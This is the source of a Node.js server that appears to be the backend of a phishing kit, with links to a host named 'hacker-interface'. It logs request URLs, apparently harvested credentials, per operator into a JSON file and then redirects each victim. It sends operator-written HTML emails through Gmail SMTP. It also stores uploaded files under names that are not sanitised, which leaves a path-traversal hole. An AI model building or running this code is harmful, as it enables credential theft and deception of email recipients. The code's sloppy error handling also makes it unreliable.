console.clear();
const formidable = require('formidable');
const nodemailer = require('nodemailer');
const express = require('express')
const crypto = require('crypto');
const WebSocket = require('ws');
const fs = require('fs');
const app = express();

const server = app.listen(80, (err) => {
    if(err) throw err;
    else console.log(`Server is running on localhost:80`)
});

const ws = new WebSocket.Server({ 
    server: server 
});

app.use('/', express.static('public'));

app.use('/register', express.static('register'));

app.use('/upload', express.static('upload'));

app.use('/view-files', (req, res) => {
    if(req.query.uuid) {
        const user = JSON.parse(fs.readFileSync('./database.json').toString())[req.query.uuid];
        if(user) {
            if(fs.existsSync(`./upload/users/${user.folder}`)) {
                const files = fs.readdirSync(`./upload/users/${user.folder}`);
                for(let file of files) res.write(`<a style="color: rgb(0, 0, 0); font-size: 20pt;" href="http://hacker-interface.mywire.org/upload/users/${user.folder}/${file}">http://hacker-interface.mywire.org/upload/users/${user.folder}/${file}</p>`);
            } else res.write('<a style="color: rgb(0, 0, 0); font-size: 20pt;">You have no files on the cloud.</a>')
        } else res.write('<a style="color: rgb(0, 0, 0); font-size: 20pt;">bad uuid.</a>');
    } else res.write('<a style="color: rgb(0, 0, 0); font-size: 20pt;">bad uuid.</a>');
    res.end();
});

app.use('/uploader', (req, res) => {
    const form = new formidable.IncomingForm();
    form.parse(req, (err, fields, files) => {
        const size = (files.file.size*0.000001).toFixed(3);///B to MB
        if(size > 0.001 && size < 200) {
            if(fields.uuid) {
                const user = JSON.parse(fs.readFileSync('./database.json').toString())[fields.uuid];
                if(user) {
                    if(err) res.write('<h1>Еrror while uploading the file.</h1>');
                    else {
                        if(!fs.existsSync(`./upload/users/${user.folder}`)) fs.mkdirSync(`./upload/users/${user.folder}`);
                        fs.renameSync(files.file.path, `./upload/users/${user.folder}/${files.file.name}`, (err) => {
                            if(err) res.write('<h1>Еrror while saving the file.</h1>');
                        });
                        res.write('<h1>File upload successful.</h1>');
                    }
                } else res.write('<h1>bad uuid.</h1>');
                res.end();
            } else res.write('<h1>bad uuid.</h1>');
        } else if(size > 200) res.write('<h1>File too big.</h1>');
        else res.write('<h1>File too small.</h1>');
    });
});

app.use('/submit/:uuid', (req, res) => {
    const user = JSON.parse(fs.readFileSync('./database.json').toString())[req.params['uuid']];//get user by uuid 
    if(user) {
        updateJSON(req.params['uuid'], req.url);
        res.send(`
            <script type="text/javascript">
                (function() { 
                    location.href = "${user.redirect}";
                })(); 
            </script>
        `);
    } else res.send('unknown uuid');
    res.end();
});

ws.on('connection', (client) => {
    client.on('message', (message) => {
        try {
            let data = JSON.parse(message);//convert stringified message to regular json object
            if(data.uuid && data.title && data.html) {
                const user = JSON.parse(fs.readFileSync('./database.json').toString())[data.uuid];//get user by uuid
                if(user) sendMail(Object.assign({}, user, data), client);//combine two objects together
                else client.send('Error, bad uuid.');
            } else client.send('Error, bad json object.');
        } catch(e) {
            client.send('Error, bad json object.');
        }
    });
});

function updateJSON(user, data) {
    fs.readFile('./database.json', (err, d) => {
        let temp = JSON.parse(d);//convert string to json format
        temp[user]['collected'].push(JSON.parse(
            `{ "${new Date()}": "${data.replace(/"/g, '')}" }`//replace " with nothing, so the server won't crash
        ));
        fs.writeFile('./database.json', JSON.stringify(temp, null, 2), (err) => { 
            if(err) throw err;
        });
    });
}

function sendMail(o, client) {
    const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        auth: {
            user: o.from, 
            pass: (() => {
                let decipher = crypto.createDecipher('aes-256-ctr', o.password.slice(0, 32));//extract the passphrase
                let dec = decipher.update(o.password.slice(32), 'hex', 'utf8');//decript
                return dec += decipher.final('utf8');
            })()
        }
    });
    transporter.sendMail({
        from: o.from,
        to: o.to,
        subject: o.title,
        text: '',
        html: o.html
    }).catch((e) => {
        client.send('Email sending was successfuly.');
        return;
    });
    transporter.verify((err, succ) => {
        if(err) client.send('Email sending was <u>not</u> successfuly.'); 
        else if(succ) client.send('Email sending was successfuly.');
    });
}